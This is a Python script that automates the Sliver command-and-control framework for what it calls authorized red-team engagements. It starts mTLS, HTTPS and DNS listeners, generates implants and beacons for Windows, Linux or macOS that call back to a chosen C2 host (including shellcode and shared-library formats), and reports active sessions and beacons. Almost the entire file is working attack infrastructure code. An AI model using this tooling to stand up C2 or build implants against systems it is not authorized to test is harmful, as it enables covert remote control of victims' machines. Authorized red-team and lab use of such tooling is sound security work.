#!/usr/bin/env python3
# For authorized penetration testing and lab environments only
"""Sliver C2 Framework Deployment Agent - Automates Sliver C2 setup for authorized red team engagements."""

import json
import subprocess
import logging
import argparse
from datetime import datetime

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def run_sliver_cmd(cmd, sliver_path="sliver-client"):
    """Execute a Sliver client command."""
    try:
        result = subprocess.run([sliver_path] + cmd, capture_output=True, text=True, timeout=60)
        return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
        return {"error": str(e)}


def generate_implant(name, os_target="windows", arch="amd64", c2_host="", c2_port=443, format_type="exe", sliver_path="sliver-client"):
    """Generate a Sliver implant (beacon or session)."""
    cmd = ["generate", "--name", name, "--os", os_target, "--arch", arch, "--mtls", f"{c2_host}:{c2_port}"]
    if format_type == "shellcode":
        cmd.append("--format=shellcode")
    elif format_type == "shared":
        cmd.append("--format=shared-lib")
    result = run_sliver_cmd(cmd, sliver_path)
    logger.info("Generated implant: %s (%s/%s)", name, os_target, arch)
    return {"implant_name": name, "os": os_target, "arch": arch, "c2": f"{c2_host}:{c2_port}", "result": result}


def generate_beacon(name, os_target="windows", arch="amd64", c2_host="", c2_port=443, interval="60s", jitter="30", sliver_path="sliver-client"):
    """Generate a Sliver beacon implant."""
    cmd = ["generate", "beacon", "--name", name, "--os", os_target, "--arch", arch, "--mtls", f"{c2_host}:{c2_port}", "--seconds", interval, "--jitter", jitter]
    result = run_sliver_cmd(cmd, sliver_path)
    return {"beacon_name": name, "interval": interval, "jitter": jitter, "result": result}


def setup_listeners(c2_host, mtls_port=8888, https_port=443, dns_domain=None, sliver_path="sliver-client"):
    """Configure C2 listeners."""
    listeners = []
    mtls_result = run_sliver_cmd(["mtls", "--lhost", c2_host, "--lport", str(mtls_port)], sliver_path)
    listeners.append({"type": "mTLS", "host": c2_host, "port": mtls_port, "result": mtls_result})
    https_result = run_sliver_cmd(["https", "--lhost", c2_host, "--lport", str(https_port)], sliver_path)
    listeners.append({"type": "HTTPS", "host": c2_host, "port": https_port, "result": https_result})
    if dns_domain:
        dns_result = run_sliver_cmd(["dns", "--domains", dns_domain], sliver_path)
        listeners.append({"type": "DNS", "domain": dns_domain, "result": dns_result})
    return listeners


def list_sessions(sliver_path="sliver-client"):
    """List active sessions."""
    return run_sliver_cmd(["sessions"], sliver_path)


def list_beacons(sliver_path="sliver-client"):
    """List active beacons."""
    return run_sliver_cmd(["beacons"], sliver_path)


def generate_report(listeners, implants, sessions_output, beacons_output):
    """Generate C2 infrastructure report."""
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "disclaimer": "For authorized penetration testing only",
        "listeners": listeners,
        "implants_generated": implants,
        "active_sessions": sessions_output,
        "active_beacons": beacons_output,
    }
    print(f"SLIVER REPORT: {len(listeners)} listeners, {len(implants)} implants")
    return report


def main():
    parser = argparse.ArgumentParser(description="Sliver C2 Framework Deployment Agent (Authorized Testing Only)")
    parser.add_argument("--c2-host", required=True, help="C2 server IP/hostname")
    parser.add_argument("--implant-name", default="test_implant")
    parser.add_argument("--os", default="windows", choices=["windows", "linux", "darwin"])
    parser.add_argument("--arch", default="amd64", choices=["amd64", "386", "arm64"])
    parser.add_argument("--sliver-path", default="sliver-client")
    parser.add_argument("--output", default="sliver_report.json")
    args = parser.parse_args()

    listeners = setup_listeners(args.c2_host, sliver_path=args.sliver_path)
    implant = generate_implant(args.implant_name, args.os, args.arch, args.c2_host, sliver_path=args.sliver_path)
    sessions = list_sessions(args.sliver_path)
    beacons = list_beacons(args.sliver_path)

    report = generate_report(listeners, [implant], sessions, beacons)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()
